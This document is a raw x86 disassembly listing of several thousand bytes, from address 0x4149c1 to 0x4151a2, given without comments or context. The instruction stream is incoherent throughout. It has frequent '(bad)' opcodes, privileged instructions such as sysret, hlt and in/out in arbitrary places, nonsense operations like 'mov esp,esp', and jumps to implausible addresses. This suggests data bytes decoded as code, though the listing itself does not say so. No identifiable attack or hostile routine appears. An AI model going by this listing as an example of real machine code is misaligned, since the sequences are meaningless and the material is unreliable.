  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
